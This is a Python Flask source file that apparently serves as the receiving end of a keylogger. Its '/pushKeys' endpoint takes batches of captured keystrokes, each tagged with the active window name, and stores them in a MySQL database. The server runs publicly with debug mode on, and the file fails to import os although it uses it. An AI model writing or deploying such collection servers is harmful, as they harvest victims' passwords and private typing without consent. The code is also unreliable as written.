from flask import Flask, render_template, request, make_response, jsonify
import json
from json import JSONEncoder
import mysql.connector

#start flask app
app = Flask(__name__)

#load the configurations from json file
def load_cfg(path):
    jsonres = {}
    try:
        with open(os.path.abspath(os.path.realpath(path)), 'r') as f:
            jsonres = json.load(f)
    except Exception as e:
        print("Exception: ", e)
    return jsonres
    
@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/pushKeys', methods=['POST'])
def addLog():
  data = json.loads(request.data)

  for key in range(len(data)):
    # datetime = data[key]['datetime']
    # epochTime = data[key]['epochTime']
    # isKeyDown = data[key]['isKeyDown']
    # windowName = data[key]['windowName']
    # asciiCode = data[key]['asciiCode']
    # asciiChar = data[key]['asciiChar']
    # keyName = data[key]['keyName']
    # isCaps = data[key]['isCaps']
    # processedKey = data[key]['processedKey']
  
    try:
      print(data[key])
      pushDB(data[key])

    except Exception as e:
      print("Exception:",e)

      return make_response(jsonify({'response': 'Fail', 'code':500}), 500)
  
  return make_response(jsonify({'response': 'Success', 'code':200}), 200)



def pushDB(payload):
  main_cfg = load_cfg('./main_cfg.json')
  
  db = mysql.connector.connect (
    host=main_cfg['dbHost'],
    user=main_cfg['sqlUser'],
    password=main_cfg['sqlPass'],
    database=main_cfg['db']
  )
  
  mycursor = db.cursor()
  
  sql = f"INSERT INTO {main_cfg['dbTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
  val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
  
  mycursor.execute(sql, val)
  db.commit()
  print(mycursor.rowcount, "it worked!!!")
  return 0 


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int("443"), debug=True)
